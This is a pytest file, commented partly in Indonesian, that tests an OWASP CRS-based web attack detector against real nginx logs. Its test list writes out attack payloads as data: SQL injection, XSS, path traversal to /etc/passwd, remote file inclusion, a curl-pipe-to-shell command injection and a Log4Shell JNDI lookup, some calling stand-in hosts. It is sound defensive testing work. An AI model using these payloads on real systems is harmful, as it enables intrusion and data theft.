"""OWASP CRS + CAPEC attack detection (Stage 21, TRD §4.6).

(a) known attack payloads per category -> hit, with the matching CAPEC;
(b) real paths that are "clean" under the old rules -> false-positive rate measured and reported (< 0.5 % at paranoia level 1);
(c) requests hit by the old rules -> records which are also hit by CRS and which are not (a report, not a requirement).
(b) and (c) use the real database (data/monishield.duckdb) when present; otherwise skipped.
"""
import collections, json, os

import pytest

from monishield.infrastructure import config
from monishield.domain import detect

V2 = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

SERANGAN = [   # (category, method, path, UA, expected CAPEC)
    ('SQLi', 'GET', "/api/x?id=1' UNION SELECT username,password FROM users--", 'Mozilla/5.0', '66'),
    ('SQLi waktu', 'GET', "/api/x?q=1';WAITFOR DELAY '0:0:5'--", 'Mozilla/5.0', '66'),
    ('XSS', 'GET', '/search?q=<script>alert(document.cookie)</script>', 'Mozilla/5.0', '242'),
    ('XSS atribut', 'GET', '/search?q="><img src=x onerror=alert(1)>', 'Mozilla/5.0', '242'),
    ('Path traversal', 'GET', '/download?file=../../../../etc/passwd', 'Mozilla/5.0', '126'),
    ('Path traversal ter-encode', 'GET', '/download?file=..%2f..%2f..%2fetc%2fshadow', 'Mozilla/5.0', '126'),
    ('RFI', 'GET', '/x?u=http://evil.example/shell.txt?', 'Mozilla/5.0', '253'),
    ('RCE', 'GET', '/x?ip=127.0.0.1;cat%20/etc/passwd', 'Mozilla/5.0', None),
    ('RCE shell', 'GET', '/x?c=$(curl%20http://evil/x.sh|sh)', 'Mozilla/5.0', None),
    ('PHP', 'GET', '/index.php?page=php://filter/convert.base64-encode/resource=index.php', 'Mozilla/5.0', '242'),
    ('Log4Shell', 'GET', '/x', '${jndi:ldap://evil.example/a}', None),
    ('Java', 'GET', '/x?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x', 'Mozilla/5.0', None),
    ('Pemindai', 'GET', '/', 'sqlmap/1.7.2#stable (https://sqlmap.org)', '310'),
    ('Pemindai', 'GET', '/', 'Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000001)', '310'),
]
BERSIH = [
    ('GET', '/api/tx-laporan/count?where={"is_suspended":null,"tipe_laporan":{"inq":["LM","RCO","investigasi"]}}', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'),
    ('GET', '/assets/index-abc123.js', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'),
    ('POST', '/api/auth/login', 'okhttp/4.9.2'),
    ('GET', '/api/laporan?search=jalan%20rusak%20di%20depan%20rumah&page=2', 'Mozilla/5.0'),
    ('GET', '/', 'Uptime-Kuma/1.23.0'),
]


@pytest.mark.parametrize('kat, meth, path, ua, capec', SERANGAN, ids=[s[0] for s in SERANGAN])
def test_muatan_dikenal_kena(kat, meth, path, ua, capec):
    r = detect.classify(meth, path, ua, 1)
    assert r, f'{kat} tidak terdeteksi: {path}'
    assert r['score'] >= detect.THRESHOLD and r['rules'] and r['severity'] in (1, 2, 3)
    if capec: assert r['capec'] == capec, (kat, r)
    assert detect.capec_name(r['capec'], 'id') and detect.capec_name(r['capec'], 'en')


@pytest.mark.parametrize('meth, path, ua', BERSIH)
def test_request_normal_bersih(meth, path, ua):
    assert detect.classify(meth, path, ua, 1) is None


def test_keterbatasan_tautologi_sql_tanpa_libinjection():
    """942100 (libinjection) skipped: the ' OR 1=1 tautology is not hit at PL1, hit at PL2 (recorded in docs/04c)."""
    p = '/api/x?id=1%27%20OR%201%3D1--'
    assert detect.classify('GET', p, '', 1) is None
    assert detect.classify('GET', p, '', 2)['capec'] == '66'
    assert any(s['id'] == 942100 and 'libinjection' in s['reason'] for s in detect.DATA['skipped'])


def test_tiap_kategori_punya_contoh_yang_kena():
    keluarga = {detect.classify(m, p, u, 1)['attack'] for _, m, p, u, _ in SERANGAN}
    assert {'sqli', 'xss', 'lfi', 'rfi', 'rce', 'injection-php', 'reputation-scanner'} <= keluarga, keluarga


def test_aturan_terkunci_dan_lengkap():
    d = detect.DATA
    assert d['version'] == 'v4.30.0' and len(d['commit']) == 40 and d['license'] == 'Apache-2.0'
    assert os.path.exists(os.path.join(V2, 'monishield', 'domain', 'CRS-LICENSE.txt'))
    assert {r['file'][8:11] for r in d['rules']} == {'913', '930', '931', '932', '933', '934', '941', '942', '944'}
    assert all(s['reason'] for s in d['skipped'])                         # skipped ones always have a reason
    assert len(detect.rules(1)) == d['counts']['by_pl']['1'] and len(detect.rules(2)) > len(detect.rules(1))
    assert {r['capec'] for r in d['rules']} <= set(detect.CAPEC['capec'])  # every CAPEC has a bilingual name


def test_transformasi():
    assert detect.url_decode('%3Cscript%3E+x') == '<script> x'
    assert detect.url_decode('%u003c', True) == '<'
    assert detect.cmd_line("c\\a't ; /etc/passwd") == 'cat/etc/passwd'
    assert detect.normalize_path('/a/b/../../../etc/passwd') == '/etc/passwd'
    assert detect.transform('/*x*/SELECT', ('replaceComments', 'lowercase')) == ' select'


# ------------------------------------------------------------------ real data
@pytest.fixture(scope='module')
def nyata():
    cfg = config.load(dotenv=False)
    if not os.path.exists(cfg.db_path): pytest.skip('database nyata tidak ada')
    import duckdb
    try: con = duckdb.connect(cfg.db_path, read_only=True)
    except duckdb.IOException: pytest.skip('database nyata sedang dipakai proses lain')
    yield con
    con.close()


def test_salah_tuduh_lalu_lintas_normal(nyata, capsys):
    """Unique paths that are CLEAN under the old rules: what percentage does CRS PL1 flag as attacks? Requirement < 0.5 %."""
    pasangan = nyata.execute("""SELECT method, path, any_value(ua) FROM nginx_access WHERE attack_cat IS NULL
                                GROUP BY method, path""").fetchall()
    kena = [(m, p, detect.classify(m, p, '', 1)) for m, p, _ in pasangan]
    kena = [(m, p, r) for m, p, r in kena if r]
    per_aturan = collections.Counter(rid for _, _, r in kena for rid in r['rules'])
    rasio = len(kena) / len(pasangan)
    with capsys.disabled():
        print(f'\n  salah-tuduh PL1: {len(kena)} dari {len(pasangan)} path bersih = {rasio:.3%}; aturan penyebab: {per_aturan.most_common(8)}')
    assert len(pasangan) > 10_000 and rasio < 0.005


def test_banding_aturan_lama(nyata, capsys):
    """Requests hit by the old rules: per old category, how many are also hit by CRS (report for docs/04c)."""
    rows = nyata.execute('SELECT attack_cat, method, path, ua, count(*) FROM nginx_access WHERE attack_cat IS NOT NULL GROUP BY ALL').fetchall()
    per = collections.defaultdict(lambda: [0, 0])
    for cat, m, p, u, n in rows:
        per[cat][0] += n
        if detect.classify(m, p, u, 1): per[cat][1] += n
    with capsys.disabled():
        print('\n  aturan lama -> juga kena CRS PL1:')
        for cat, (n, k) in sorted(per.items(), key=lambda x: -x[1][0]): print(f'    {cat:28} {k:6} dari {n:6} ({k / n:.0%})')
    assert per and sum(k for _, k in per.values()) > 0
